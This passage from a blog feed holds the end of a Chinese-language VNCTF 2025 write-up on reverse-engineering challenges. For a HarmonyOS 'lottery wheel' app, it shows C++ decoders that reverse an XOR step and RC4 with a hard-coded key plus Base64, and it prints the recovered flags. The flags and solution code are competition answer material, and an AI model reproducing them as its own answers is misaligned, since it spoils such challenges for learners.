class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Original, java.nio.charset.StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3}</strong></p><h3 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h3><p>jadx分析hap文件中的modules.abc文件</p><p><img src="/2025/02/12/VNCTF2025/zp1.png" alt="e2917f062e0a2de095ca14ce3b6c365e"></p><p>在MyPage下发现一段字节数组。</p><p><img src="/2025/02/12/VNCTF2025/zp2.png" alt="QQ_1739080781927"><img src="/2025/02/12/VNCTF2025/zp6.png" alt="QQ_1739080763900"></p><p>获取到一个字符串存到lexenv_0_0中，进行了一次forEach对每个字节进行了加密计算。然后再调用函数对比那个字节数组与被加密的字符串，比较是否相等，这边应该就是最后的一次加密和对比。可以将这段字节数组进行逆向计算，可以得到一串明文。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123; <span class="number">101</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">83</span>, <span class="number">62</span>, <span class="number">111</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">127</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">93</span>, <span class="number">115</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">7</span>;</span><br><span class="line">EncFlag[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.44s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="comment">// aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字符串像是Base64加密。</p><p>可以看到hap文件下有一个libhello.so。jadx全局搜索可以看到有调用libhello里面的MyCry函数，应该就是加密函数。</p><p><img src="/2025/02/12/VNCTF2025/zp3.png" alt="QQ_1739081075481"></p><p>使用IDA进行逆向分析libhello.so，通过字符串搜搜MyCry查找交叉引用找到Call。</p><p>可以看到以下流程很清晰，获取字符串，将字符串进行RC4加密（密钥为”Take_it_easy”），然后再进行Base64加密，这边判断了一个值是否等于40走不同分支。</p><p>RC4加密流程没被魔改，就最后将加密数据多异或了一个值，两个分支分别是异或上了40和24。尝试后发现40可以解密出明文。</p><p>将之前解密到的Base64字串进行decode然后RC4解密即可。</p><p><img src="/2025/02/12/VNCTF2025/zp4.png" alt="QQ_1739081335258"></p><p><img src="/2025/02/12/VNCTF2025/zp5.png" alt="QQ_1739081364253"></p><p>解密代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Data, <span class="type">unsigned</span> <span class="type">long</span> Len_D, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">rc4_init</span>(s, key, Len_k);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Cyberchef Base64 Decode(&quot;aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs&quot;)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;<span class="number">0x68</span>,<span class="number">0xB2</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x9A</span>,<span class="number">0x8E</span>,<span class="number">0xFC</span>,<span class="number">0x0A</span>,<span class="number">0x41</span>,<span class="number">0xA4</span>,<span class="number">0x0F</span>,<span class="number">0xC2</span>,<span class="number">0xF5</span>,<span class="number">0x2F</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,<span class="number">0x8B</span>,<span class="number">0x1A</span>,<span class="number">0xD4</span>,<span class="number">0xC4</span>,<span class="number">0x83</span>,<span class="number">0x06</span>,<span class="number">0xD8</span>,<span class="number">0xA3</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0xAA</span>,<span class="number">0x63</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x2C</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] ^= <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Take_it_easy&quot;</span>;</span><br><span class="line"><span class="built_in">rc4_crypt</span>(EncFlag, <span class="number">33</span>, Key, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] -= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.33s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{JUst_$ne_Iast_dance_2025!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-2025-WP&quot;&gt;&lt;a href=&quot;#VNCTF-2025-WP&quot; class=&quot;headerlink&quot; title=&quot;VNCTF 2025 WP&quot;&gt;&lt;/a&gt;VNCTF 2025 WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot;</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
